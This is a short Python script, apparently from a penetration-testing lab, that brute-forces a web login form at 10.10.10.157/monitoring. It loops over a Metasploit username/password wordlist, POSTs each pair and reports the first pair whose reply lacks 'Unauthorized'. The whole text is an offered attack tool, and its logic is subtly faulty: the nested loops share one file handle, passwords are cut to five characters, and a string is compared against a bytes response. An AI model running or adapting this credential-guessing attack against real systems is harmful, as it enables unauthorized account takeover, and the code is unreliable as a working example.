
import requests


target_url = "http://10.10.10.157/monitoring"
data_dict = {"username": "", "password": ""}


try:
    total = 0;
    with open("/usr/share/metasploit-framework/data/wordlists/root_userpass.txt","r") as word_list:
        for username in word_list:
            word_u = username.strip()
            print("Username: " + word_u)
            for password in word_list:
                word_p = password[:5].strip()
                print("[" + word_u + "]" + "  Password: " + word_p)
                data_dict["username"] = word_u
                data_dict["password"] = word_p
                response = requests.post(target_url, data=data_dict)
                if "Unauthorized" not in response.content:
                    print("[+]Correct login:" + "\n Username: " + word_u + "\n Password: " + word_p)
                    exit()

    print("[-] Password not found.")

except KeyboardInterrupt:
    print("[-]Quitting...")


